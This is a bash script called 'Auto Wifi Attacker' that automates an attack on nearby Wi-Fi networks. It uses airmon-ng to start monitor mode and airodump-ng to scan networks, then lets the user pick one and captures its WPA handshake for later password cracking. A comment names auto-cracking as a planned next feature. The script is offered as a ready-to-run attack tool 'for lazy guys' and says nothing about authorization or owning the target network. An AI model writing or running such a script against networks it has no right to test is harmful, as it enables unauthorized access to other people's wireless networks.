#!/usr/bin/env bash
RED='\033[0;31m'
NC='\033[0m' # No Color
GREEN='\033[0;32m'
GREENL='\033[1;32m'
BLU='\033[0;34m'
YLOW='\033[0;33m'

printf "${GREEN}"
headerTxt=(
"|----------------------------------------------------------------|"
"|                      Auto Wifi Attacker                        |"
"|              Created by D4rkC0d3 for lazy guys :D              |"
"|                         Version: 1.0.0                         |"
"|         ----------------------------------------------         |"
"|                     ─────█─▄▀█──█▀▄─█─────                     |"
"|                     ────▐▌──────────▐▌────                     |"
"|                     ────█▌▀▄──▄▄──▄▀▐█────                     |"
"|                     ───▐██──▀▀──▀▀──██▌───                     |"
"|                     ──▄████▄──▐▌──▄████▄──                     |"
"|________________________________________________________________|"
""
"Usage:")
for each in "${headerTxt[@]}"
do
  echo "$each"
  sleep 0.1
done

cat<<EOF
Just start the script 0_o
This script is not a new tool, the script uses the following tools:
'Airmon-ng' to start monitor mode
'Airodump-ng' to scan near wireless and capture the handshak

how it work:
After start monitor mode and scaning the near wireless ,You can choose wich wifi you want to make target 0_-, then start listening to capture wifi handshak.
Step 1:
open xterm terminal and scan near wifi:
You most close terminal to continue , Close the terminal whenever you want, but make sure at least 1 or 2 WiFi are found.

Step 2:
Select your target by selecting the desired number

Step 3:
open xterm terminal and listen for handshak:
You most close terminal to continue, Close the terminal whenever you want, but make sure handshak are captured.

future:
add auto crack password :D
EOF
#EOF

printf "${NC}"
echo "Do you want to start the search? (y|n)"
read start
if [ $start == 'y' ]
then
  echo ""
  echo "Please wait for start Wlan0 monitor mod..."
  if airmon-ng start wlan0 >/dev/null
  then
    echo "Wlan0 monitor mod started..."
  else
    echo "Somting wrong..."
  fi
  sleep 3
  echo "Searching for wifies started..."
  rm "Output-01.csv" >/dev/null 2>&1
  xterm -hold -e "airodump-ng -w Output --output-format csv wlan0mon"
  #awk '{print $1;}' Output-01.csv| grep -oP '[a-zA-Z0-9]{2}:[a-zA-Z0-9]{2}:[a-zA-Z0-9]{2}:[a-zA-Z0-9]{2}:[a-zA-Z0-9]{2}:[a-zA-Z0-9]{2}'
  echo -e "${GREENL}"
  n=1
  #output = "Output-01.csv"
  awk 'NR==3 , NR==10 {print $(NF-1);}' Output-01.csv| cut -d, -f1 | while IFS= read -r row
  do
    echo ""$n"- "$row""
    n=$((n+1))
  done;
  echo 100 - Exit
  echo -e "${NC}"
  echo 'Please select a wifi number to start attack:'
  read wfnumber
  n=1
  awk 'NR==3 , NR==10 {print $(NF-1);}' Output-01.csv| cut -d, -f1 | while IFS= read -r row
  do
    if (($wfnumber == $n)) ;
    then
      sleep 2
      s=1
      awk 'NR==3 , NR==10 {print $1;}' Output-01.csv| cut -d, -f1 | while IFS= read -r row2
      do
        if (($wfnumber == $s)) ;
        then
          m=1
          awk 'NR==3 , NR==10 {print $6;}' Output-01.csv| cut -d, -f1 | while IFS= read -r row3
          do
            if (($wfnumber == $m)) ;
            then
              echo -e "Ok, now started listening on ${GREENL}"$row"${NC} wifi with bssid ${GREENL}"$row2"${NC} in channel ${GREENL}"$row3"${NC} ."
              echo "Please wait for a handshak and then close the popuped terminal."
              #start airodump for capture handshake
              rm 666target* >/dev/null 2>&1
              xterm -hold -e  "airodump-ng -w 666target -c $row3 --bssid $row2 wlan0mon"
            fi
            m=$((m+1))
          done;
        fi
        s=$((s+1))
      done;
    fi
    n=$((n+1))
  done;
  #stop monitoring mod
  airmon-ng stop wlan0mon
  echo ""
  echo "If you did not captured any handshake , try another wifi :)"
else
  echo ""
  echo -e "${RED}Good luck...  ;)${NC}"
fi
